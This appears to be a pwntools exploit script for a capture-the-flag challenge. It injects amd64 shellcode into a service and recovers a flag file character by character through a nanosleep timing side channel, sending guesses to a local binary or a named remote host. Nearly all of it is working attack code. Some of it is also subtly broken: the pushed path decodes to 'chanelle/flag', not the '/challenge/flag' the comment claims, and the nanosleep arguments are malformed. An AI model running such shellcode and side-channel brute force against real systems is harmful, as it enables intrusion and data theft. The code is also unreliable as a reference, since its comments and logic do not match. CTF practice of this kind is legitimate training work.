from pwn import *
import time
import string

context.arch = 'amd64'
context.log_level = 'info'

def create_timing_shellcode(position, char):
    shellcode = asm(f'''
        /* Open /challenge/flag */
        mov rax, 0x00000067616c662f
        push rax
        mov rax, 0x656c6c656e616863
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall
        
        /* Read flag into stack */
        mov rdi, rax
        sub rsp, 0x100
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax
        syscall
        
        /* Check character at position {position} */
        cmp byte ptr [rsi + {position}], {char}
        jne skip
        
        /* If match, nanosleep for 0.1 seconds */
        push 0
        push 100000000
        mov rsi, rsp
        xor rdi, rdi
        mov rax, 35
        syscall
        add rsp, 16
        
    skip:
        xor rdi, rdi
        mov rax, 60
        syscall
    ''')
    
    return shellcode.ljust(1024, b'\x90')

def brute_force_flag():
    flag = ""
    position = 0
    
    while len(flag) < 50:
        log.info(f"Position {position}, current: {flag}")
        found_char = False
        
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!"
        
        for char in charset:
            try:
                if args.REMOTE:
                    p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
                else:
                    # Test locally with the actual binary
                    p = process(["./benchmarking_service"])  # Adjust path as needed
                
                # Send shellcode directly to the binary
                shellcode = create_timing_shellcode(position, ord(char))
                p.send(shellcode)
                
                # Wait for process to complete and measure time locally
                start = time.time()
                p.wait()
                end = time.time()
                time_taken = end - start
                
                log.info(f"Char '{char}': {time_taken:.3f}s")
                
                # Check timing (adjust threshold based on your baseline)
                if time_taken > 0.05:  # nanosleep should make it >0.1s
                    flag += char
                    log.success(f"Found: '{char}' -> {flag}")
                    found_char = True
                    position += 1
                    break
                    
            except Exception as e:
                log.warning(f"Error with '{char}': {e}")
                try:
                    p.close()
                except:
                    pass
                continue
            finally:
                try:
                    p.close()
                except:
                    pass
        
        if not found_char:
            log.warning(f"No char found for position {position}")
            break
            
        if flag.endswith('}'):
            log.success(f"Complete: {flag}")
            break
    
    return flag

if __name__ == "__main__":
    brute_force_flag()